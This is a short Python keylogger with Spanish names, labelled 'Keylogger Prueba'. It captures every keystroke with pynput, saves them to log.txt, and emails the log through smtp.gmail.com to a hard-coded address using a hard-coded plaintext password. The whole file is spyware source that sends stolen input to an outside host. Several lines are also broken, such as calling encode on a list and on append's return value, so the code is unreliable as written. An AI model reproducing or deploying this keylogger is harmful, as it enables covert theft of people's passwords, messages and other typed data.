import pynput.keyboard
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


log_file= open('log.txt', 'w')

def enviar_datos():
    msg = MIMEMultipart()
    password = '75971442kK'
    msg['From'] = 'atuncarpoma@gmail.com'
    msg['To'] = 'atuncarpoma@gmail.com'
    msg['Subject'] = 'Keylogger Prueba'
    msg.attach(MIMEText(lines))

    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(msg['From'], password)
        server.sendmail(msg['From'],msg['To'],msg.as_string())
        server.quit()
    except:
        pass

def imprimir():
    teclas = ''.join(lista_teclas)
    log_file.write(teclas)
    log_file.write('\n')
    log_file.close()
    time.sleep(3)
    enviar_datos()

lista_teclas = [].encode('utf-8')


def convertir(key):
    if isinstance(key, pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)

def presiona(key):
    key1 = convertir(key)
    if key1 == 'Key.esc':
        print('Saliendo...')
        imprimir()
        return False
    elif key1 == 'Key.space':
        lista_teclas.append(" ").encode('utf-8')
    elif key1 == 'Key.enter':
        lista_teclas.append('\n').encode('utf-8')
    elif key1 == 'Key.backspace':
        pass
    elif key1 == 'Key.tab':
        pass
    elif key1 == 'Key.shift':
        pass
    else:
        lista_teclas.append(key1).encode('utf-8')

fic = open('log.txt', "r")
lines = fic.readlines()
fic.close()
with pynput.keyboard.Listener(on_press=presiona) as listen:
    listen.join()

